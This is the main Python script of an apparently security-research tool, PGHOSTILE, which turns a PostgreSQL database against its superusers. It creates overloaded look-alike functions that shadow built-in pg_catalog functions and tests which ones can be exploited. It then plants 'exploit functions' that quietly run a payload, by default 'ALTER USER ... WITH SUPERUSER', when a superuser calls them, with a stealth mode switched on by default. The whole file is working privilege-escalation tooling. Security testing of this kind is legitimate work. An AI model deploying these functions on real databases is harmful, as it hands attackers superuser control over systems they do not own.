# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io

import sys
import os
import argparse
import getpass
import psycopg2
from psycopg2 import Error
from core.utils import print_ok, print_err, get_convertion_matrix, convert_types
from core.database import Database
from core.dbfunction import DBFunction


def make_it_hostile(db, exploit_payload, stealth_mode=False, create_exploit=True, run_tests=True, out_dir="./out", track_execution=False):
    defined_functions = []

    try:
        print_ok("Starting ... \n")
        argtypes_filter = [f"{oid} = any(p.proargtypes)" for oid in get_convertion_matrix().keys()]
        # @TODO is it ok to get only f() from pg_catalog? probably we should also incude public
        qry = """
            SELECT n.nspname as ns, p.proname as name, p.pronargs as nargs, p.proargtypes as argtypes, p.prorettype as rettype
            FROM pg_catalog.pg_namespace n JOIN pg_catalog.pg_proc p ON p.pronamespace = n.oid
            WHERE p.prokind = 'f' and p.pronargs > 0 and n.nspname = 'pg_catalog' and (
                %s
            )
        """ % " or ".join(argtypes_filter)

        found_functions_cnt = 0
        res = db.query(qry)
        for record in res.fetchall():
            found_functions_cnt += 1
            initial_types = [int(i) for i in record['argtypes'].split()]
            conv_types = convert_types(initial_types)
            for artype in conv_types:
                df = DBFunction(record['name'], artype, initial_types, record['rettype'], exploit_payload, stealth_mode, track_execution)
                defined_functions.append(df)
        print("[ * ] %s interesting functions have been identified" % found_functions_cnt)
        errors = []
        if len(defined_functions) > 0:
            if run_tests:
                print("[ * ] Creating test functions")
                for df in defined_functions:
                    try:
                        # print("Attempting to create %s" % df)
                        db.query(df.create_query_test)
                        df.created = True
                    except psycopg2.errors.DuplicateFunction:
                        print_err(f"Test function {df} is already defined! Stopping")
                        db.close()
                        return
                    except Exception as e:
                        df.created = False
                        errors.append(f"Exception creating test function {df} {e}")
                        pass

                print("[ * ] Testing functions")
                for df in defined_functions:
                    if not df.created:
                        continue
                    try:
                        # print("Testing %s" % df.test_query)
                        db.query("drop function if exists public.___test_wrapper()")
                        db.query(df.test_query)
                        db.query("select public.___test_wrapper()")
                        db.query("drop function public.___test_wrapper()")
                        df.test_ok = True
                    except Exception:
                        pass
                print("[ * ] Deleting test functions")
                for df in defined_functions:
                    if not df.created:
                        continue
                    try:
                        db.query(df.drop_query)
                        # print(df.drop_query)
                    except Exception as e:
                        errors.append(f"Exception deleting test function {df} {e}")

            if create_exploit:
                print("[ * ] Creating exploit functions")
                for df in defined_functions:
                    try:
                        # print("Attempting to create %s" % df)
                        db.query(df.create_query_exploit)
                        df.created = True
                    except psycopg2.errors.DuplicateFunction:
                        print_err(f"Exploit function {df} is already defined! Stopping")
                        db.close()
                        return
                    except Exception as e:
                        df.created = False
                        errors.append(f"Exception creating exploit function {df} {e}")

            created_functions = {df.name for df in defined_functions if df.created}
            print("[ * ] Done! %s functions have been created\n" % len(created_functions))
            if create_exploit:
                with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
                    for df in defined_functions:
                        if df.created:
                            f.write(f"{df.drop_query};\n")

            with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
                if run_tests:
                    exploitables = []
                    for df in defined_functions:
                        if df.test_ok and df.test_query not in exploitables:
                            f.write(f"{df.test_query};\n")
                            exploitables.append(df.test_query)
                    print_ok("%s exploitable functions and params combinations have been tested!" % len(exploitables))
                else:
                    f.write("You need to run the tests to generate this file")
            print_ok(f"The '{out_dir}' folder contains the output")

        with open(os.path.join(out_dir, "errors.txt"), "w") as f:
            for err in errors:
                f.write(f"{err};\n")

    except (Exception, Error) as error:
        raise  # @TODO
    finally:
        db.close()


def main():
    parser = argparse.ArgumentParser(description='PGHOSTILE. Make PostgreSQL an hostile environment for superusers')
    parser.add_argument('db_username', metavar='db_username', type=str, help='Database username')
    parser.add_argument('db_name', metavar='db_name', type=str, help='Database name')
    parser.add_argument("-X", "--disable-exploits-creation", default=False, action='store_true', help='Do not create exploit functions')
    parser.add_argument("-H", '--db-host', default="127.0.0.1", type=str, help='Database host (default 127.0.0.1)')
    parser.add_argument("-p", '--db-port', default=5432, type=int, help='Database port')
    parser.add_argument("-P", "--ask-pass", action='store_true', help='Prompt for database passsword')
    parser.add_argument("-o", '--out', default="./out", type=str, help='Output dir (deafult ./out)')
    parser.add_argument("-T", "--skip-tests", default=False, action='store_true', help='Disable test')
    parser.add_argument("-s", "--disable-stealth-mode", default=False, action='store_true', help='Disable stealth mode')
    parser.add_argument("-S", '--db-ssl-mode', type=str, help='Database ssl mode (default None)')
    parser.add_argument("-x", '--exploit-payload', type=str, help='The SQL commands')
    parser.add_argument("-t", "--track-execution", default=False, action='store_true', help='Track the exploit function execution')
    args = parser.parse_args()

    if not os.path.isdir(args.out):
        print_err(f"Error: {args.out} is not a folder")
        return 1

    db_pass = os.environ.get("PGPASSWORD", None)
    if not db_pass or args.ask_pass:
        db_pass = getpass.getpass(prompt="Enter DB password:")

    # if args.skip_tests and args.disable_exploits_creation:
    #     print_err("Error: using both -X and -T won't produce any output... exiting")
    #     return 2

    try:
        db = Database(
            username=args.db_username,
            password=db_pass,
            database=args.db_name,
            host=args.db_host,
            port=args.db_port,
            sslmode=args.db_ssl_mode
        )
    except Error as error:
        print_err(f"Error while connecting to PostgreSQL: {error}")
        return 2

    if args.track_execution:
        try:
            db.query("create schema if not exists pghostile")
            db.query("""
                create table if not exists pghostile.triggers (
                    id SERIAL primary key,
                    fname varchar(255),
                    params text,
                    current_query text,
                    created_at timestamp without time zone default (now() at time zone 'utc')
                );
            """)
        except Error as error:
            print_err(f"Error creating tracking table: {error}")
            return 3

    exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"

    make_it_hostile(
        db,
        exploit_payload,
        stealth_mode=not args.disable_stealth_mode,
        create_exploit=not args.disable_exploits_creation,
        run_tests=not args.skip_tests,
        out_dir=args.out,
        track_execution=args.track_execution
    )

    return 0


if __name__ == "__main__":
    sys.exit(main())
